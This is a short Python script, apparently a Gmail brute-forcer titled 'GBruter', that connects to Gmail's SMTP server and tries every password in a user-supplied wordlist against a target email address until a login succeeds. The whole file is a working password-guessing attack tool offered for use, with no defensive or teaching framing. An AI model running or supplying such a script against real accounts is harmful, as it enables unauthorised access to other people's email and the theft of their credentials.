#!/usr/bin/env python3
import os
import smtplib
from termcolor import colored

os.system('clear')

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

def banner():
    print(colored("##############################################################", 'green'))
    print(colored("#          ____ ____  ____  _   _ _____ _____ ____           #", 'blue'))
    print(colored("#         / ___| __ )|  _ \| | | |_   _| ____|  _ \          #", 'blue'))
    print(colored("#        | |  _|  _ \| |_) | | | | | | |  _| | |_) |         #", 'blue'))
    print(colored("#        | |_| | |_) |  _ <| |_| | | | | |___|  _ <          #", 'blue'))
    print(colored("#         \____|____/|_| \_^____/  |_| |_____|_| \_\         #", 'blue'))
    print(colored("#                                                            #", 'blue'))
    print(colored("##############################################################", 'green'))
    print(colored("#                         @coder_8                           #", 'green'))
    print(colored("############################################################## \n", 'green'))

def start_program():
    banner()
    #Enter the email address over this code
    #user = example@gmail.com
    user = ""
    print("[+]    Email Address: " + user)
    passwdfile = input("[+]    Enter the path of the password wordlist: ")
    file = open(passwdfile, "r")

    for password in file:
        password = password.strip("\n")
        try:
            smtpserver.login(user, password)
            print(colored("[+]    Password Found: %s" % password, 'green'))
            break
        except smtplib.SMTPException:
            print(colored("[-]    Wrong Password: " + password, 'red'))


start_program()
